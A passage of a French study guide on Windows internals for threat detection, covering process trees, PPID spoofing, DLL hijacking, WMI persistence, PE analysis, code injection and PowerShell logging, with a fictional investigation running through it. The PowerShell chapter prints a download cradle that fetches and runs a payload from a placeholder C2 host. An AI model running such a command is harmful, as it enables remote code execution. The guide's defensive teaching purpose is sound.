---
title: Partie II — Processus, exécution et code
source: IT/02 Windows/Windows en profondeur.md
note: Windows en profondeur
up:
- - Windows en profondeur
  - index.md
---

*Comment le code s'exécute, se charge et se dissimule — le terrain de jeu des malwares.*

---


## Chapitre 6 — Processus et threads : anatomie et arbre normal

### 6.1 Anatomie d'un processus

Un processus Windows est constitué de : son **PEB** (Process Environment Block — informations sur le processus : chemin de l'image, command line, variables d'environnement, DLLs chargées), son espace d'adressage virtuel, ses handles (références aux objets kernel), son **token d'accès** (identité — SID de l'utilisateur, groupes, privilèges), et ses threads (unités d'exécution). La création passe par CreateProcess → NtCreateProcess → le noyau crée les structures. **PID** (Process ID) et **PPID** (Parent PID) identifient le processus et son parent — le PPID est fondamental pour reconstruire l'arbre.

### 6.2 L'arbre de processus normal — la baseline de détection

Connaître l'arbre normal est le fondement de la détection comportementale (développé en détail au Ch.31). L'essentiel : **System** (PID 4) → **smss.exe** → **csrss.exe** (session 0) + **wininit.exe** → **services.exe** → **svchost.exe** (multiples instances). En parallèle : **csrss.exe** (session 1) + **winlogon.exe** → **userinit.exe** → **explorer.exe** → applications utilisateur.

Pour chaque processus critique, l'analyste vérifie 4 choses : le **parent attendu** (svchost.exe doit être enfant de services.exe — si son parent est explorer.exe ou cmd.exe, c'est suspect), le **chemin d'image attendu** (svchost.exe doit être dans C:\Windows\System32 — un svchost.exe dans C:\Users\... est un malware qui se fait passer pour un processus légitime), le **nombre d'instances attendu** (lsass.exe = 1 seule instance — 2 lsass.exe = le second est probablement malveillant), et le **contexte utilisateur attendu** (services.exe s'exécute sous SYSTEM — s'il s'exécute sous un compte utilisateur, c'est anormal).

**svchost.exe** mérite une attention particulière : chaque instance légitime héberge un ou plusieurs services identifiés par l'argument **-k** dans la command line (svchost.exe -k netsvcs, svchost.exe -k LocalService). Un svchost.exe sans argument -k, ou avec un argument -k inhabituel, est suspect. Sur Windows 10/11, chaque service a tendance à avoir son propre svchost.exe (séparation pour la fiabilité) — le nombre d'instances est donc élevé (30-60+) mais chacune a des arguments et un service identifiables.

### 6.3 PPID Spoofing

Un attaquant peut forger le PPID via CreateProcess avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — le processus malveillant semble être un enfant d'un processus légitime (svchost.exe, explorer.exe) au lieu de cmd.exe ou powershell.exe. Détection : Sysmon Event 1 enregistre le PPID réel et le ParentImage — la comparaison avec les ETW ou les logs de création de processus du noyau peut révéler l'incohérence.

### 6.4 Fil rouge — SHADOW : l'arbre anormal

> **🔍 SHADOW — Épisode 2**
>
> Léa examine l'arbre de processus complet de la machine compromise dans CrowdStrike. L'anomalie est claire : `winword.exe` (parent : explorer.exe — normal) → `rundll32.exe` (parent : winword.exe — anormal, le parent normal de rundll32 pour les opérations légitimes est explorer.exe ou svchost.exe). De plus, un `svchost.exe` (PID 8240) s'exécute avec le parent `rundll32.exe` — doublement anormal : svchost.exe devrait toujours être enfant de services.exe. Ce svchost.exe n'a pas d'argument -k et son image path est C:\Windows\System32\svchost.exe mais son image en mémoire ne correspond pas (Process Hollowing — Ch.9).

---


## Chapitre 7 — DLLs, services, WMI, COM et mécanismes d'exécution

Les **DLLs** (Dynamic Link Libraries — code partagé entre processus). Le **DLL Search Order** (le répertoire de l'application d'abord, puis System32, puis Windows, puis le PATH → **DLL Hijacking** si un attaquant place une DLL malveillante dans un répertoire prioritaire). Les **Known DLLs** (cache kernel des DLLs système protégées contre le hijacking — HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs).

Les **services Windows** (gérés par SCM — services.exe). Types : Win32OwnProcess (son propre processus), Win32ShareProcess (hébergé dans svchost.exe). Un service malveillant avec StartType=Auto = persistence au reboot. Event 7045 = nouveau service installé — signal de détection. Les **scheduled tasks** (Task Scheduler — persistence via tâche au logon/boot ; Event 4698 = tâche créée). Les **COM Objects** (Component Object Model — modèle d'interaction entre composants ; **COM Hijacking** = détournement via modification du CLSID dans le registre — le processus charge la DLL de l'attaquant au lieu du composant légitime).

Le **WMI** (Windows Management Instrumentation — framework d'administration) : requêtage (wmic, Get-WmiObject), exécution à distance (wmic process call create "cmd.exe"), et **WMI Event Subscriptions** comme persistence (FilterToConsumerBinding — un événement déclenche l'exécution d'un script ou d'un binaire ; extrêmement discret ; détection : Sysmon Events 19/20/21). Le **BITS** (Background Intelligent Transfer Service — transferts en arrière-plan, utilisable comme canal de téléchargement discret et persistence — bitsadmin, Event BITS).

---


## Chapitre 8 — Format PE et analyse statique

Le format **PE** (Portable Executable — structure commune à .exe, .dll, .sys, .scr). La structure : DOS Header (signature MZ) → PE Header → Optional Header (entry point, image base, subsystem) → Section Table → Sections (.text = code, .data = données, .rdata = imports/exports read-only, .rsrc = ressources). L'**Import Address Table** (IAT — les fonctions importées depuis d'autres DLLs ; les imports suspects : VirtualAlloc, WriteProcessMemory, CreateRemoteThread, NtCreateThreadEx → injection de code ; URLDownloadToFileA → téléchargement ; WinExec, ShellExecute → exécution ; CryptEncrypt → ransomware potentiel). L'**Export Table** (fonctions exportées par une DLL).

Les **strings** (chaînes de caractères dans le binaire — URLs C2, commandes, clés de registre, chemins — Strings de Sysinternals ou FLOSS pour les strings obfusquées). L'**entropy** (mesure du « désordre » dans les sections — une entropy élevée > 7 indique du packing ou du chiffrement — les sections .text légitimes ont une entropy de 5-6). Le **packing** (UPX, Themida, VMProtect — le code est compressé/chiffré, décompressé au runtime ; signaux : peu d'imports visibles, forte entropy, sections avec des noms inhabituels). Les **signatures numériques** (Authenticode — un binaire signé par un éditeur légitime est plus fiable ; les certificats volés ou frauduleux sont utilisés par les APT — Stuxnet, SolarWinds ; vérification : sigcheck, Get-AuthenticodeSignature).

Fil rouge : Léa analyse le payload téléchargé par la macro Word — une DLL avec une forte entropy dans .text (packing), des imports suspects (VirtualAlloc, NtCreateThreadEx), et pas de signature Authenticode.

---


## Chapitre 9 — Injection de code et techniques d'évasion

*Les techniques que les malwares modernes utilisent pour exécuter du code dans un autre processus et échapper à la détection.*

Le **Process Injection classique** : OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread — l'attaquant alloue de la mémoire dans un processus légitime, y écrit du shellcode, et crée un thread pour l'exécuter. Le code malveillant s'exécute dans le contexte du processus cible (svchost.exe, explorer.exe) et hérite de sa réputation. Le **DLL Injection** (charger une DLL malveillante via CreateRemoteThread + LoadLibrary, SetWindowsHookEx, ou QueueUserAPC). Le **Process Hollowing** (créer un processus légitime en état suspendu, vider sa mémoire via NtUnmapViewOfSection, remplacer par du code malveillant via WriteProcessMemory, puis reprendre le thread — le processus semble légitime dans le Task Manager mais exécute du code malveillant). Le **Reflective DLL Loading** (charger une DLL en mémoire sans écrire de fichier sur disque et sans appeler LoadLibrary — la DLL se mappe elle-même via son propre loader ; aucun fichier .dll sur le disque → très discret).

Le **PPID Spoofing** (CreateProcess avec PPID forgé — Ch.6). Les **syscalls directs** (appeler directement les fonctions kernel — NtAllocateVirtualMemory au lieu de VirtualAllocEx — pour contourner les hooks EDR en user mode ; les EDR hook les fonctions ntdll.dll en user mode → les syscalls directs sautent par-dessus ces hooks).

La **détection** : Sysmon Event 8 (CreateRemoteThread — processus source → processus cible), Event 10 (ProcessAccess — accès à la mémoire d'un autre processus), Event 25 (ProcessTampering — image file hollowing), ETW Microsoft-Windows-Threat-Intelligence provider. Les EDR hook les fonctions user mode pour détecter ces techniques — les syscalls directs et le BYOVD (Ch.20) contournent ces défenses.

Fil rouge : le malware de Valtec utilise du Process Hollowing — un processus svchost.exe avec un PID suspect s'exécute avec services.exe comme parent (PPID Spoofing) mais son image en mémoire ne correspond pas à son image sur disque.

---


## Chapitre 10 — PowerShell : exécution, journalisation et investigation

*PowerShell est à la fois l'outil le plus puissant pour l'investigation et le vecteur d'attaque le plus courant.*

PowerShell comme **vecteur d'attaque** : download cradles (IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')), encodage base64 (powershell -enc [base64]), bypass de la politique d'exécution (-ExecutionPolicy Bypass), **AMSI bypass** (les attaquants patachent amsi.dll en mémoire pour désactiver le scan avant exécution — Ch.20), **fileless** (le code est exécuté en mémoire sans jamais toucher le disque — Invoke-ReflectivePEInjection, Invoke-Mimikatz).

La **journalisation PowerShell** — les 3 niveaux de défense : **Script Block Logging** (Event 4104 — enregistre TOUT le code exécuté après désobfuscation, y compris après AMSI bypass — la source de détection n°1), **Module Logging** (Event 4103 — enregistre les appels de modules avec les paramètres), **Transcription** (enregistre tout l'input/output dans un fichier texte — le plus complet mais le plus volumineux). Les 3 niveaux doivent être activés par GPO.

PowerShell pour l'**investigation** : commandes de triage (Get-Process, Get-Service, Get-ScheduledTask, Get-NetTCPConnection, Get-WinEvent — filtrage par Event ID et TimeCreated, Get-ItemProperty registre — clés Run/Services, Get-ChildItem C:\Windows\Prefetch). Fil rouge : Léa examine les logs PowerShell — Event 4104 montre le code déobfusqué du payload : téléchargement via certutil, DLL déposée dans %TEMP%, exécution via rundll32, puis injection en mémoire.

---
